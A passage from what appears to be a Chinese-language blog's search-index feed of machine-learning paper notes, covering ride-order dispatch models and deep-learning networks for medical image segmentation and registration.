c}, \lambda_{s e g}^{1}, \lambda_{s e g}^{2}, \lambda_{a d v}^{p_{1}}, \lambda_{a d v}^{p_{2}}, \lambda_{a d v}^{\tilde{s}}\right}$ 是用于平衡各项的参数，在实验时分别设为 ${0.1,10,1.0,0.1,0.1,0.01,0.1}$。 四、网络设置和实施细节 生成器 $G_t$ 采用的是和 CycleGAN 中一样的设置，包括3个卷积层，9个残差块，2个反卷积层，然后再通过一个卷积层获得生成的图像。 解码器 U 包括1个卷积层，4个残差块，3个反卷积层，然后再通过一个卷积层获得输出。 判别器 ${D_t,D_s,D_p}$ 采用的是和 PatchGAN 一样的设置，它的输入是 $70\times70$ 的patches，它包括5个卷积层，除了最后两层卷积层步长为1，其他的卷积核为4，步长为2。特征图的个数分别为 ${64,128,256,512,1}$。在前四层卷积层中每个卷积层后都跟着一个实例正则化和一个0.2的 Leaky ReLU。 编码器 E 使用残差连接和空洞卷积（dilation rate=2），来扩大分辨率的大小。用 ${Ck,Rk,Dk}$ 分别表示通道数为 $k$ 的卷积层、残差块和空洞残差块；用 M 表示步长为 2 的最大池化层；则编码器的构成为 ${C16,R16,M,R32,M,2\times R64,M,2\times R128,4\times R256,2\times R512,2\times D512,2\times C512}$。每个卷积操作后都跟着一个批正则化和 ReLU 激活函数。 像素级分类器 $C_1$ 连接到编码器 E 的最后一层（$2\times C512$）后面来得到输出，$C_2$ 最后连接到编码器 E 的 $2\times R512$ 块的后面来得到输出。$C_1,C_2$ 都只包含一个 $1\times1$ 的卷积层。 batch size 为8，使用的是 Adam 优化器，学习率为 $2\times 10^{-4}$。]]></content>
      <categories>
        <category>医学图像处理</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[【论文笔记】基于DQN和知识迁移的订单分配模型]]></title>
    <url>%2F2020%2F05%2F18%2FOROD%2F</url>
    <content type="text"><![CDATA[本文是论文《Deep Reinforcement Learning with Knowledge Transfer for Online Rides Order Dispatching》的阅读笔记。 一、介绍文章把订单分配问题建模成一个 MDP，并且提出了基于 DQN 的解决策略，为了增强的模型的适应性和效率，文章还提出了一种相关特征渐进迁移（Correlated Feature Progressive Transfer）的方法，并证明了先从源城市学习到分配策略，然后再将其迁移到目标城市或者同一个城市的不同时间的方法，比没有迁移的学习效果要好。 订单分配问题有两个挑战，第一个挑战是提升订单分配的效率，另一个挑战是模型的可拓展性。之前的模型通常通过按照城市来将订单分配问题分解为小问题，将订单分配问题建模成一个 MDP，并通过离散的基于表格的方法进行求解，但是为每个城市构建一个模型并进行训练也是不太现实的。这种方法存在三个问题： 存在很多实时变化的因素，诸如交通的供需情况，这对于基于表格的方法来说是很难实时的考虑并处理的； 不同城市的出行过程被看作是具有相同结构的不同 MDP，而基于表格的方法不能实现在不同城市之间的知识迁移； 训练的收敛往往需要很长的时间。 由于强化学习的方法在训练初期通常学习速度很慢，所以利用相关的先验知识进行迁移极大的提升了学习的效率。 二、MDP智能体是从司机的角度来定义的，智能体主动去寻找适合当前司机的订单。一次出行包括接车和把乘客送到目的地两部分，然后司机就可以获得即时奖励，当然司机也可能是空闲的，此时收益为0。 状态 $s$：包括司机的地理位置和当前的时间（单位是秒），用 $s:=(l,t)$ 表示，其中 $l$ 是司机的经纬度，$t$ 是当前时间。除此之外，状态还可能包括一些额外的信息 $f$，如供需状态、附件订单的完成情况等，此时状态表示为 $s:=(l,t,f)$。 动作 $a$：将订单分配给一个司机，用 $s_0:=(l_0,t_0,f_0)$ 表示当前的状态，用 $s_1:=(l_1,t_1,f_1)$ 表示到达目的地后的状态，那么行为可以表示为 $a=(l_1,t_1)$，所有的行为空间表示为 $\mathcal{A}$。 收益 $r$：一趟旅程的总收入，是关于状态和动作的函数。 episode：把一天看作一个 episode。 状态-行为值函数 $Q(s,a)$：是一个 episode 内司机的累计收益的期望，表示为 $Q(s, a):=E\left[\sum_{t=0}^{T} \gamma^{t} R\left(S_{t}, A_{t}\right) | S_{0}=s, A_{0}=a\right]$，$S,A,R$ 是 $s,a,r$ 的随机变量。$T$ 是到达终点状态经过的步数，把时间划分为10分钟为一步。 策略 $\pi(a|s)$：是从状态到行为的一个映射，关于 $Q(s,a)$ 的贪心策略表示为 $\pi(s):=\arg \max _{a} Q(s, a)$ 状态值函数 $V(s)$：从某个状态 $s$ 开始，按照策略 $\pi$ 采取行动，一个 episode 内司机所得到的累计收益的期望。当采取关于 $Q(s,a)$ 的贪心策略时，状态值函数为 $V(s):=Q(s,\pi(s))=\max_{a\in\mathcal{A}}Q(s,a)$ 三、带有行为搜索的 DQN1. 模型为了提升训练的稳定性，使用了 Double-DQN，并使用用户的历史出行数据来进行训练，同时简单的合成了一些数据用作数据增强。 2. 行为搜索通过构造行为的近似可行空间 $\hat{\mathcal{A}}(s)$ 来近似求解 $Q(s,a)$，文章不是在所有的有效动作中进行搜索，而是从 $s$ 附近的历史行程中搜索$$\tilde{\mathcal{A}}(s):=\left{x_{s_{1}} | x \in \mathcal{X}, B\left(x_{s_{0}}\right)=B(s)\right}$$其中 $\mathcal{X}$ 是所有行程的集合，$B(s)$ 是 $s$ 所属的离散的时空，文章将地区划分成多个六边形仓，每个六边形仓由其中心点坐标表示，搜索空间越大，需要的计算时间就越长，所以文章把搜索时的行为数设成一个可训练的参数。在策略估计时，也是用类似的搜索过程，那时会利用历史出行数据来模拟司机一天的轨迹。 行为搜索的伪代码如下： 3. 拓展行为搜索在早上时在一个偏远地区进行搜索可能会返回一个空集，这时就需要在时间和空间上进行拓展动作搜索。第一种搜索方向是保持下车的位置不变，等待下一轮进行搜索，直到以下情况的一种发生： 如果 $\hat{\mathcal{A}}(s’)$ 非空，则返回 $\hat{\mathcal{A}}(s’)$ 如果到达终止状态，则返回终止状态 如果 $s’_t$ 超过了等待时间的上限，则返回 $s’$ 第二种搜索方向是通过分层的方式对当前位置的相邻六边形进行拓展搜索，定义 $L$ 层的时空仓为 $B(s,L)$，源自该时空仓的历史出行数据的集合为：$$\tilde{\mathcal{A}}(s, L):=\left{x_{s_{1}} | x \in \mathcal{X}, B\left(x_{s_{0}}\right) \in B(s, L)\right}$$当 $\tilde{\mathcal{A}}(s, L)$ 非空时，则停止增加 $L$，并返回 $\tilde{\mathcal{A}}(s, L)$；反之返回 $B(s,L_{max})$，即六边形仓的中心点及其相应的时间。$L_{max}$ 是用来控制搜索空间的最大层数。 4. 终止状态值当一个 episode 结束时，无论位置如何， $Q(s,a)$ 的值应该接近于0，在每次训练的开始，将 $s_1$ 作为终止状态放入回放池中，这样可以加快收敛。 5. 在多司机匹配环境下的配置我们将调度窗口中收集的订单分配给一组司机，以最大化分配的总价值。$$\arg \max {a \in \mathcal{A}^{\prime}} \sum{s \in \mathcal{S}} Q(s, a(s))$$其中 $a(s)$ 是从多个订单中选择一个订单分配给司机 $s$ 的分配函数，$\mathcal{A}’$ 是所有分配方程的空间，$S$ 是空闲司机的集合，订单和司机的匹配可以看作是二分图匹配问题，可以用 KM 算法来解决。 6. 表格形式中的状态值$Q(s,a)$ 可以用 $r+V(B(s’))$ 来采样近似，$A:=r+V(B(s’))-V(B(s))$ is the advantage associated with the trip assignment x and is used as the edge weights. $V^{}(B(s)):=\max _{a \in \tilde{\mathcal{A}}} Q^{}(s, a)$ $V^{\pi}(B(s)):=\operatorname{mean}_{a \in \tilde{\mathcal{A}}} Q^{\pi}(s, a)$ 四、多城市迁移考虑三种迁移学习的方法：微调、渐进网络（progressive network）和相关特征渐进迁移（CFPT），迁移学习共同的思想是利用从源城市学习到的参数应用的目标城市。 微调：先在源城市训练网络，然后再将训练得到的网络权重在目标城市网络中使用，参数在反向传播时微调。 渐进网络：通过与目标网络的横向连接利用训练权重，连接函数为：$$h_{i}^{(t)}=f\left(W_{i}^{(t)} h_{i-1}^{(t)}+U_{i}^{(c)} h_{i-1}^{(s)}\right)$$其中 $W_i^{(t)}$ 表示目标网络第 $i$ 层的权重矩阵，$U_i^{(c)}$ 表示来自源任务网络的横向连接权重矩阵，$h_i^{(t)}$ 和 $h_i^{(s)}$ 表示目标网络和源网络第 $i$ 层的输出。$f(\cdot)$ 是激活函数。 如图三中 Progressive 图所示，首先训练一个源网络（绿色），然后将其乘以横向连接权重连接到目标网络（蓝色），在目标网络的训练过程中源网络（绿色）的权重保持不变。 CFPT：由于状态空间是十分多样的，所以并不是所有的状态元素对于不同的城市都适应。按照图四为源城市训练一个平行的渐进结构，其连接函数和横向连接中用到的相同。网络的输入也分成了两部分：$s$ 表示那些直觉上不适应目标城市的元素，$f$ 表示那些适应目标城市的元素。目标网络和源网络结构相同，并且重用源网络中渐进部分（图四中绿色的块）的权重。CFPT 的创新性在于当训练源网络时，把网络分成了两个平行流，下面的流只关心输入 $f$。我们将相关特征输入 $f$ 看作是时空位移向量和实时上下文特征之间的连接，三元时空位移向量通过 $(s_1-s_0)$ 计算得到， 五、实验为了实现对目标城市的鲁棒有效的网络训练，文章进行了两种类型的迁移实验，包括空间迁移和时间迁移。在空间迁移方面，将 A 市作为源城市，将其他三个城市作为目标城市。对于时间迁移，以一个月数据训练的城市模型为源，以一个月后数据训练的同一城市模型为目标。]]></content>
      <categories>
        <category>强化学习</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[【论文笔记】基于组合优化的订单分配模型]]></title>
    <url>%2F2020%2F05%2F18%2FTODM%2F</url>
    <content type="text"><![CDATA[本文是论文《A Taxi Order Dispatch Model based On Combinatorial Optimization》的阅读笔记。 一、摘要传统的订单分配系统都是最大化每个订单的司机接受率，通常会对于每个订单寻找一个最近的司机，这导致了较低的全局成功率，并且订单分配的时间较长。文章提出了一个目的地预测模型，可以在用户一打开APP的时候就对用户可能去的目的地进行预测，本文提出的模型不仅在全局成功率，而且在用户等待时间、接车距离等方面都获得了很大的提升。 在本文提出的模型中，会把一个订单分配给多个司机，当第一个接受订单的司机获得该订单，如果没有被接受，则进入下一轮直到订单被接受或被取消。 一个订单主要有三个重要的属性：出发时间、出发位置和目的地位置，文章提出的贝叶斯目的地预测模型会使用用户的历史出行目的地作为目的地预测的候选集合。贝叶斯目的地预测模型以出发时间、出发位置和目的地位置为输入，并将其看作一个三元的高斯分布，然后会生成每个目的地的概率，并按照概率大小给出一个预测目的地的列表。 二、订单分配系统1. 记号 $E_{SR}$：成功率 $N$：订单数 $M$：司机数 订单分配结果可以用一个矩阵来表示：$$\left(\begin{array}{ccc}a_{11} &amp; \cdots &amp; a_{1 M} \ \vdots &amp; a_{i j} &amp; \vdots \ a_{N 1} &amp; \cdots &amp; a_{N M}\end{array}\right), where\quad 1 \leq i \leq N, 1 \leq j \leq M\and\quad a_{i j}=\left{\begin{array}{ll}1 &amp; \text { order } i \text { is dispatched to driver } j \ 0 &amp; \text { order } i \text { is not dispatched to driver } j\end{array}\right.$$一个司机只能同时接一个订单，而一个订单可以分配给多个司机，所以上式满足约束 $\forall j,\Sigma_{i=1}^Na_{ij}\leq1$ 订单分配的关键是估计每个司机接单的概率， 然后进一步就可以计算一个订单被司机接受的概率了，因此将订单分配模型划分为两部分：一个模型预测司机的行为，即预测每个司机接单的概率；另一个模型最大化目标函数 $E_{SR}$。 2. 司机行为预测模型司机的行为有两种——接受订单和拒绝订单，并用变量 $y$ 来表示司机行为的结果，$y$ 是一个二值变量，接受为1，拒绝为0。假设司机的行为服从一个独立同分布。 用 $p_{ij}$ 表示订单 $o_i$ 被司机 $d_j$ 接受的概率，这个概率可能受到订单的价格、行驶距离和目的地方向等诸多因素的影响，这些因素可以编码为一个特征向量 $x_{ij}$。给定 $x_{ij}$，需要估计一个司机的接受概率，即：$$p_{ij}=p(y=1|x_{ij})$$这样就把司机行为的预测问题转变成了一个经典的二分类问题。 文章测试了 LR（logistic regression）和 GBDT（梯度提升决策树）在两个数据集上的 ACC（accuracy）和 AUC（曲线下面积），由上表可知，LR 模型的效果更好，所以最终选择 LR 模型最为司机行为预测模型，概率 $p_{ij}$ 可以写为：$$p_{ij}=p(y=1|o_i,d_j)=\frac{1}{\exp(-w^Tx_{ij})}$$司机行为预测模型主要考虑以下因素： 订单-司机相关特征：接车距离、订单目的地是否在司机的行驶方向的前方 订单相关特征：出发地和目的地之间的距离、预计到达时间（ETA）、目的地的类别（机场、旅馆、学校、工作场所等）、交通状况、目的地的历史订单频率 司机相关特征：司机的接单率、司机活动的范围、司机偏爱的订单距离 其他特征：是否是工作日、一天中的时刻、订单附件的司机数 假设 $N$ 个订单被分配给 $M$ 个司机，则订单 $o_i$ 被接受的概率为：$$E_i=1-\Pi^M_{j=1}(1-p_{ij})^{a_{ij}}$$所以，成功率 $E_{SR}$ 为：$$E_{S R}=\frac{\sum_{i=1}^{N}\left[1-\prod_{j=1}^{M}\left(1-p_{i j}\right)^{a_{i j}}\right]}{N}$$加上每个司机同时最多接受一个订单的约束条件，最终的订单分配问题可以表示为：$$\left{\begin{array}{c}\max {a{i j}} E_{S R}=\frac{\sum_{i=1}^{N}\left[1-\prod_{j=1}^{M}\left(1-p_{i j}\right)^{a_{i j}}\right]}{N} \\text { s.t. } \forall j, \sum_{i=1}^{N} a_{i j} \leq 1, a_{i j} \in{0,1}\end{array}\right.$$很多组合优化问题都是 NP 难问题，通常没有通用的高效算法来解决，这里选用的是爬山法（hill-climbing method）来解决该问题，算法流程如下： 三、目的地预测$$\begin{array}{lll}\hline \text { Symbol } &amp; \text { Meaning } &amp; \text { Range } \\hline T &amp; \text { time of day } &amp; {[0,24)} \D &amp; \text { Day of the week } &amp; \text { workday, holiday } \\text {Lng} &amp; \text { Departure Longi- } &amp; {[-180,180]} \&amp; \text { tude } &amp; \\text {Lat} &amp; \text { Departure } &amp; {[-90,90]} \&amp; \text { Latitude } &amp; \Y &amp; \text { Description } &amp; \begin{array}{l}\text { Set of User Historic Destina- } \\text { tions, }\left{y_{1}, y_{2}, \ldots, y_{i}, \ldots, y_{n}\right}\end{array} \\hline\end{array}$$ 同一个用户通常在相似的时间回去相同的目的地，同一个用户去的目的地集合基本是固定的，订单的位置对目的地预测很重要。 用贝叶斯公式来表达用户去目的地 ${y_1,y_2,…,y_i,…,y_n}$ 的条件概率：$$p\left(Y=y_{i} | X\right)=\frac{p\left(X | Y=y_{i}\right) p\left(Y=y_{i}\right)}{\sum_{j=1}^{n} p\left(X | Y=y_{j}\right) p\left(Y=y_{j}\right)}$$其中 $X=(T,Lng,Lat)$ 表示出发时间、出发经度和出发维度。可以通过用户的历史出行记录来估计 $p(Y=y_i)$：$$p\left(Y=y_{i}\right)=\frac{\operatorname{freq}\left(y_{i}\right)}{\sum_{j=1}^{n} \operatorname{freq}\left(y_{j}\right)}$$ 通过上图可知，用户在不同时间出行的目的地近似服从高斯分布，所以用高斯分布来估计关于出发时间 $T$ 的条件概率：$$T | Y=y_{i} \sim N\left(\mu_{i}, \sigma_{i}^{2}\right)$$并且可以发现变量 $T$ 是循环性的，它的值从0到23，然后重复。因此高斯分布的均值 $\mu_i$ 和方差 $\sigma_i^2$ 不能用传统的方法来估计，一个计算循环量均值的方法是先将所有的循环量转换为单位向量，然后计算向量的均值，并将结果转换为原始的循环表示。给定时间 $t_1,t_2,…,t_m$，均值可以通过下式计算：$$\mu=\frac{24}{2 \pi} \cdot \arctan \left[\frac{1}{m} \sum_{k=1}^{m} \sin \left(\frac{2 \pi}{24} \cdot t_{k}\right), \frac{1}{m} \sum_{k=1}^{m} \cos \left(\frac{2 \pi}{24} \cdot t_{k}\right)\right]$$但是通过该公式计算出的结果与真实结果会存在偏差，并且在某些特定情况（当sin和cos的求和项为0时）下，会无解。为了解决该问题，文章提出了一个计算出发时间均值和方差的方法。出发时间的均值可以通过求解以下二次优化问题来获得：$$\left{\begin{array}{l}\min {\mu} \sum{k=1}^{m}\left[\operatorname{distance}\left(t_{k}, \mu\right)\right]^{2} \\text { s.t. } \mu \in[0,24)\end{array}\right. 公式()$$其中 $distance(t_1,t2)$ 表示两个循环变量 $t_1$ 和 $t_2$ 之间的距离，定义如下：$$\operatorname{distance}\left(t_{1}, t_{2}\right)=\left{\begin{array}{ll}\left|t_{1}-t_{2}\right| &amp; \text { if }\left|t_{1}-t_{2}\right| \leq 12 \24-\left|t_{1}-t_{2}\right| &amp; \text { if }\left|t_{1}-t_{2}\right|&gt;12\end{array}\right.$$也可以简写为：$$\operatorname{distance}\left(t_{1}, t_{2}\right)=-\left|\left(\left|t_{1}-t_{2}\right|-12\right)\right|+12$$将其带入公式() 中得：$$\left{\begin{array}{l}\left.\min {\mu} \sum{k=1}^{m}\left[\left|\left(\left|t_{k}-\mu\right|-12\right)\right|-12\right)\right]^{2} \\text { s.t. } \mu \in[0,24)\end{array}\right.$$同理，可以通过类似的方法估计方差 $\sigma^2$：$$\sigma^{2}=\frac{1}{m-1} \sum_{k=1}^{m}\left[\left|\left(\left|t_{k}-\mu\right|-12\right)\right|-12\right]^{2}$$ 图二表示去中关村和知春路关于时间的分布，可以发现给定时间很容易区分目的地是哪；而图三表示去数字庄园和丽宝广场关于时间的分布，可以发现两者的重合比较严重，给定时间很难区分目的地是哪；图四表示去数字庄园和丽宝广场关于时间、经纬度的分布，在三维空间下给定时间、经纬度很容易区分目的地。通过以上三个图可以发现，三维分布能更容易的区分出两个不同的目的地。假设在给定目的地 $y_i$ 时，订单的经纬度和时间的条件概率满足三维高斯分布：$$\text { Lat, } \operatorname{Lng}, T | Y=y_{i} \sim N_{3}\left(\boldsymbol{\mu}{i}, \Sigma{i}\right)$$以下是目的地预测的完整过程： 估计每个用户目的地的均值 $\mu_i$ 和方差 $\sigma_i$ 计算 $p(Y=y_i)$：$$p\left(Y=y_{i}\right)=\frac{\operatorname{freq}\left(y_{i}\right)}{\sum_{j=1}^{n} \operatorname{freq}\left(y_{j}\right)}$$并计算 $p(T,Lat,Lng|Y=y_i)$ 利用贝叶斯公式计算 $p(Y=y_i|T,Lat,Lng)$：$$\begin{array}{c}p\left(Y=y_{i} | T, L a t, \ln g\right)= \\frac{p\left(T, \operatorname{Lat}, \operatorname{Lng} | Y=y_{i}\right) p\left(Y=y_{i}\right)}{\sum_{j=1}^{n} p\left(T, \operatorname{Lat}, \operatorname{lng} | Y=y_{j}\right) p\left(Y=y_{j}\right)}\end{array}$$ 按照概率 $p(Y=y_i|T,Lat,Lng)$ 对目的地进行排序，并给出一个列表]]></content>
      <categories>
        <category>强化学习</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[【论文笔记】图像分割和图像配准联合学习模型——DeepAtlas]]></title>
    <url>%2F2020%2F05%2F11%2FDeepAtlas%2F</url>
    <content type="text"><![CDATA[本文是论文《DeepAtlas: Joint Semi-Supervised Learning of Image Registration and Segmentation》的阅读笔记。 文章第一个提出了一个图像配准和图像分割联合学习的网络模型 DeepAtlas，该模型实现了弱监督的图像配准和半监督的图像分割。在图像配准时使用图像的分割标签作为监督数据，如果没有分割标签，则通过分割网络产生；而经过配准后的图像增加了在图像分割时可利用的训练数据的量，相当于是一种数据增强。该模型不仅在分割和配准的精度上有所提升，并且还可以在训练数据有限的情况下实现较好的效果。 一、记号 $I_m$：浮动图像（moving image） $I_t$：目标图像（target image） $\mathcal{F}_R$：配准网络 $\theta_r$：配准网络的参数 $\mathcal{F}_S$：分割网络 $\theta_s$：分割网络的参数 $u=\mathcal{F}_R(I_m,I_t;\theta_r)$：形变场 $\phi^{-1}=u+id$：形变图，其中 $id$ 是恒等变换 $I_m^w=I_m\circ\phi^{-1}$：配准后的图像 $S_t$：目标图像分割标签 $S_m^w=S_m\circ\phi^{-1}$：配准后图像分割标签 二、网络结构DeepAtlas 的目的是当数据集中只有少量的分割标签可用时，通过联合训练来让分割和配准实现较高的精度。 网络的结构如上图所示，蓝色的实线表示弱监督的配准，黄色虚线表示半监督的分割。 文章在附件中给出了分割网络和配准网络的具体结构，如下图左右两图所示： 1. 配准网络配准网络的损失主要有三个损失函数组成：配准正则损失 $\mathcal{L}_r$，图像相似度损失 $\mathcal{L}_i$ 和解剖损失（分割相似度损失） $\mathcal{L}_a$。配准正则损失 $\mathcal{L}_r$ 可以让形变场 $\phi$ 变得光滑，图像相似度损失 $\mathcal{L}_i$ 用来评价浮动图像 $I_m$ 和配准后图像 $I_m^w$ 之间的相似度，解剖损失（分割相似度损失） $\mathcal{L}_a$ 是目标图像分割标签 $S_t$ 和配准后图像分割标签 $S_m^w$ 之间的相似度损失。 如此一来，配准学习的过程可以由下式表示：$$\theta_{r}^{\star}=\underset{\theta_{r}}{\operatorname{argmin}}\left{\mathcal{L}{i}\left(I{m} \circ \Phi^{-1}, I_{t}\right)+\lambda_{r} \mathcal{L}{r}\left(\Phi^{-1}\right)+\lambda{a} \mathcal{L}{a}\left(S{m} \circ \Phi^{-1}, S_{t}\right)\right}$$其中 $\lambda_r,\lambda_a\geq0$。 2. 分割网络分割网络的输入是一张图像 $I$，输出相应的分割结果 $\hat{S}=\mathcal{F}S(I;\theta_s)$，分割网络的损失主要有两个损失函数组成：解剖损失 $\mathcal{L}_a$ 和有监督分割损失 $\mathcal{L}{sp}$。解剖损失和配准网络中的相同，有监督的分割损失 $\mathcal{L}{sp}(\hat{S},S)$ 是分割网络的分割结果 $\hat{S}$ 和人工分割结果 $S$ 之间的相似度损失。但是浮动图像 $I_m$ 和目标图像 $I_t$ 的分割标签的存在情况有多种可能，所以相应的损失函数也存在以下四种情况：$$\left{\begin{array}{l}\mathcal{L}{a}=\mathcal{L}{a}\left(S{m} \circ \Phi^{-1}, \mathcal{F}{\mathcal{S}}\left(I{t}\right)\right) \text { and } \mathcal{L}{s p}=\mathcal{L}{s p}\left(\mathcal{F}{\mathcal{S}}\left(I{m}\right), S_{m}\right), \text { if } I_{t} \text { is unlabeled; } \\mathcal{L}{a}=\mathcal{L}{a}\left(\mathcal{F}{\mathcal{S}}\left(I{m}\right) \circ \Phi^{-1}, S_{t}\right) \text { and } \mathcal{L}{s p}=\mathcal{L}{s p}\left(\mathcal{F}{\mathcal{S}}\left(I{t}\right), S_{t}\right), \text { if } I_{m} \text { is unlabeled; } \\mathcal{L}{a}=\mathcal{L}{a}\left(S_{m} \circ \Phi^{-1}, S_{t}\right) \text { and } \mathcal{L}{s p}=\mathcal{L}{s p}\left(\mathcal{F}{\mathcal{S}}\left(I{m}\right), S_{m}\right), \text { if } I_{m} \text { and } I_{t} \text { are labeled; } \\mathcal{L}{a}=\mathcal{L}{s p}=0, \text { if both } I_{t} \text { and } I_{m} \text { are unlabeled. }\end{array}\right.$$分割的学习过程可以由下式表示：$$\theta_{s}^{\star}=\underset{\theta_{s}}{\operatorname{argmin}}\left(\lambda_{a} \mathcal{L}{a}+\lambda{s p} \mathcal{L}{s p}\right), \quad \lambda{a}, \lambda_{s p} \geq 0$$ 三、实施细节 解剖相似度损失 $\mathcal{L}{a}$ 和有监督的分割损失 $\mathcal{L}{sp}$ 采用的是 soft multi-class Dice loss： $$\mathcal{L}{\text {dice}}\left(S, S^{\star}\right)=1-\frac{1}{K} \sum{k=1}^{K} \frac{\sum_{x} S_{k}(x) S_{k}^{\star}(x)}{\sum_{x} S_{k}(x)+\sum_{x} S_{k}^{\star}(x)}$$ ​ 其中 $k$ 表示分割标签的下标，$x$ 是体素位置，$S$ 和 $S^*$ 是两个要比较的分割标签。 图像相似度损失 $\mathcal{L}_i$ 采用的是正则化的互相关（NCC）： $$\mathcal{L}{i}\left(I{m}^{w}, I_{t}\right)=1-N C C\left(I_{m}^{w}, I_{t}\right)$$ 配准正则损失 $\mathcal{L}_r$ 采用的是弯曲能（bending energy）： $$\mathcal{L}{r}(\mathbf{u})=\frac{1}{N} \sum{\mathbf{x}} \sum_{i=1}^{d}\left|H\left(u_{i}(\mathbf{x})\right)\right|_{F}^{2}$$ ​ 其中 $||\cdot||_F$ 表示弗罗贝尼乌斯范数（Frobenius norm），$H(u_i(x))$ 是第 $i$ 个成分 $u(x)$ 的 Hessian 矩阵，$d$ 表示维度，$N$ 表示体素数。 在训练时，会交替的训练分割网络和配准网络，当一个网络在训练时，另一个网络的参数保持不变，并且是每训练配准网络20次才训练分割网络1次，这是因为分割网络更容易收敛。 四、实验结果]]></content>
      <categories>
        <category>医学图像处理</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[【论文笔记】双流金字塔配准网络——Dual-PRNet]]></title>
    <url>%2F2020%2F05%2F11%2FDual-PRNet%2F</url>
    <content type="text"><![CDATA[本文是论文《Dual-Stream Pyramid Registration Network》的阅读笔记。 文章提出了一个名为 Dual-PRNet 的双流金字塔配准网络（Dual-Stream Pyramid Registration Network），它可以实现无监督的3D医学图像配准。文章的贡献主要有两个： 设计了一个双流的3D编码器-解码器网络来分别计算 fixed image 和 moving image 的特征金字塔（由从小到大的特征图组成的类似金字塔形状的）； 提出了一种金字塔配准模型，它可以从解码器产生的特征图直接产生多个不同尺度的配准场（形变场）。 3D 医学图像配准任务可以看作是预测一个形变场 $\phi$，以使得浮动图像 $M$ 经过该形变场变形后产生的图像 $W=M\circ\phi$ 尽可能与固定图像 $F$ 相对齐，该过程可以被表示下式：$$\hat{\Phi}=\arg \min {\Phi} \mathcal{L}(F, M, \Phi), \quad \mathcal{L}(F, M, \Phi)=\mathcal{L}{\operatorname{sim}}(F, M \circ \Phi)+\lambda \mathcal{L}{\text {smooth}}(\Phi)$$其中，$\mathcal{L}{sim}$ 是固定图像 $F$ 和变形后的图像 $M\circ\phi$ 之间的相似度度量，$\mathcal{L}_{smooth}$ 是让形变场 $\phi$ 保持平衡的正则约束，上式也是 VoxelMorph 所采用的损失函数形式。 Dual-PRNet 可以看作是 VoxelMorph 的一种改进，VoxelMorph 只通过CNN产生的最后一个特征图计算单个形变场，这限制了它处理大尺度形变的能力，Dual-PRNet 可以预测多个不同分辨率的形变场。 上图是网络的结构示意图，双流的编码器-解码器网络指的就是图中分别对固定图像和浮动图像进行处理的两个类似于 U-Net 的网络（图中黄色和蓝色的部分），而 VoxelMorph 是将固定图像和浮动图像作为两个通道输入到一个类似于 U-Net 的网络中，是单流的。而金字塔配准模型是指的以上两个网络的中间部分，可以发现两个类似于 U-Net 的网络的解码器部分和传统的有所不同。在具体操作时，会先将解码器当前层产生的形变场进行两倍的上采样，然后作用在下一层的浮动图像上，得到变形后的图像，再与下一层图像一起做 $3\times3\times3$ 的卷积操作，形成下一层的形变场。重复该过程，就得到了不同分辨率的形变场，最后一层的输出结果就是最终的形变场。该过程可以用下式表示：$$\Phi_{i}=C_{i}^{3 \times 3 \times 3}\left(P_{i}^{M} \circ u\left(\Phi_{i-1}\right), P_{i}^{F}\right)$$其中 $u(\phi_{i-1})$ 是第 $i-1$ 层的上采样操作，$C_i^{3\times3\times3}$ 是3D卷积操作，$P_i^M$ 和 $P_i^F$ 分别是浮动图像和固定图像的体素。 此外，文章使用负的局部互相关（NLCC）作为衡量图像相似度的损失度量，而平滑损失和 VoxelMorph 的相同。文章在 LPBA40 和 Mindboggle101 两个数据集上做了实验，以下是配准的结果。上边一行是产生的5个不同分辨率的形变场，下面一行从左到右分别是浮动图像、根据形变场得到的5个变形图像和固定图像。]]></content>
      <categories>
        <category>医学图像处理</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[【论文笔记】Probabilistic Multilayer Regularization Network for Unsupervised 3D Brain Image Registration]]></title>
    <url>%2F2020%2F05%2F11%2FPMRN%2F</url>
    <content type="text"><![CDATA[本文是关于论文《Probabilistic Multilayer Regularization Network for Unsupervised 3D Brain Image Registration》的阅读笔记。 文章提出了一个无监督的3D脑部图像配准网络，用来捕获 fixed image 和 moving image 之间特征级（feature-level）的信息。网络包括分别对 fixed image 和 moving image 进行处理的两个深度CNN，以及一个对以上两个CNN处理结果进行对齐的特征级概率网络。这两种网络实现了不同级别的特征提取。 传统的基于模型（深度学习）的配准网络都忽视了两张输入图像之间的特征级的转换关系，CNN的隐藏层学习到的特征对于隐含变量（latent variable）来说是透明的，所以在本文中首先使用了两个CNN，一个CNN用来 fixed image 中提取特征，另一个从 moving image 中提取特征。此外，还用一个概率网络在两个CNN对应的隐藏层之间捕获它们的转换关系。此外还在CNN的多个层中嵌入了正则项，以在不同层产生特征级的隐含变量。最后，通过把在所有层中预测得到的特正级隐含变量结合，得到最终的用于配准的隐含变量。 首先使用两个CNN产生两组具有不同分辨率的特征图集合，然后用一个特征级的概率推断模型来估计特征级的隐含变量，该隐含变量表示的是在两个CNN相同层的特征图之间的转换关系。然后把每一层产生的特征图扩大到相同的大小，将它们加起来产生最终的隐含变量 $z$。然后把 moving image $x$ 和隐含变量 $z$ 输入到空间转换网络（STN）中产生最终的配准后的图像。 $(F_x^i,F_y^i)$ 表示两个CNN第 $i$ 层产生的特征图，$F_z^i$ 表示概率模型产生的第 $i$ 层的隐含变量， 它实际是让 $F_x^i$ 对齐到 $F_y^i$ 的 STN 的参数，或者说形变场。在已知 $F_x^i,F_y^i$ 的情况下，可以通过最大化后验概率 $p(F_z^i|F_x^i;F_y^i)$ 来得到最优的 $F_z^i$。具体的，引入了一个近似后验概率 $q_\psi(F_z^i|F_x^i;F_y^i)$ ，然后最小化 $p(F_z^i|F_x^i;F_y^i)$ 和 $q_\psi(F_z^i|F_x^i;F_y^i)$ 之间的KL散度来使得两个分布尽可能的相似，该过程可以用下式表示：$$\begin{aligned}&amp; \min {\psi} K L\left[q{\psi}\left(F_{z}^{i} | F_{x}^{i} ; F_{y}^{i}\right) | p\left(F_{z}^{i} | F_{x}^{i} ; F_{y}^{i}\right)\right] \=&amp; \min {\psi} K L\left[q{\psi}\left(F_{z}^{i} | F_{x}^{i} ; F_{y}^{i}\right) | p\left(F_{z}^{i}\right)\right]-E_{q} \log p\left(F_{y}^{i} | F_{z}^{i} ; F_{x}^{i}\right)\end{aligned}$$其中 $q_\psi(F_z^i|F_x^i;F_y^i)$ 来自于多元正态分布：$$q_{\psi}\left(F_{z}^{i} | 